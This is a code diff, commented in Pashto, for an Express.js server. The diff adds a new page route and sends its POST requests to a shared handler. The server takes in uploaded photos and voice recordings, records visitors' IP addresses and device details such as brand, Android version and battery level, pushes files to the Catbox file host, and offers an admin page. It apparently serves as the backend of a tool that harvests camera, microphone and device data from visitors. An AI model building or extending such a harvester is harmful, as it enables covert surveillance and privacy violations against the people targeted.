@@ -30,13 +30,18 @@ const upload = multer({ storage: multer.memoryStorage() });
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// د پاڼو مسیرونه (Routes)
+// --- پخواني مسیرونه (سکتورونه) په خپل حال پاتې دي ---
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.get('/page1', (req, res) => {
     res.sendFile(path.join(__dirname, 'index2.html'));
+});
+
+// --- نوي اضافه شوي مسیرونه د (index3 او index4) لپاره ---
+app.get('/page3', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index3.html'));
 });
 
 // Catbox ته د فایل د اپلوډ کولو فنکشن
@@ -57,8 +62,18 @@ async function uploadToCatbox(buffer, filename) {
     }
 }
 
-// د ډېټا د راټولولو او پوسټ کولو برخه (د ټولو پاڼو لپاره یو شان کار کوي)
+// د پخوانیو پاڼو پوسټ ریکویسټونه
 app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
+    handleIncomingData(req, res);
+});
+
+// د نوي /page3 پاڼې پوسټ ریکویسټونه
+app.post('/page3', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
+    handleIncomingData(req, res);
+});
+
+// عمومي فنکشن د ډېټا د پروسس او ذخیره کولو لپاره
+async function handleIncomingData(req, res) {
     let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'نامعلوم';
     if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
     if (clientIp === '::1' || clientIp === '::ffff:127.0.0.1') clientIp = '127.0.0.1 (Localhost)';
@@ -69,7 +84,6 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req,
         try {
             const info = JSON.parse(req.body.device_info);
             const entryText = `📅 نېټه: ${time}\n🌐 آی‌پي: ${clientIp}\n📱 برانډ: ${info.deviceType}\n🔢 انډرایډ/اوس: ${info.androidVer}\n📐 سکرین: ${info.screenSize}\n🔋 بیټرۍ: ${info.batteryLevel}\n🌐 ژبه: ${info.language}\n-----------------------------------`;
-            
             await DeviceInfo.create({ time, ip: clientIp, info: entryText });
             return res.send("Device Info Saved");
         } catch (e) {}
@@ -103,9 +117,9 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req,
     }
 
     res.status(400).send("Bad Request");
-});
+}
 
-// د اډمین پاڼه
+// د اډمین پاڼه (بدون تغیر په پخواني منطق)
 app.get('/admin', async (req, res) => {
     const showWelcome = !req.headers.cookie?.includes('welcome=true') && req.query.action !== 'enter';
 
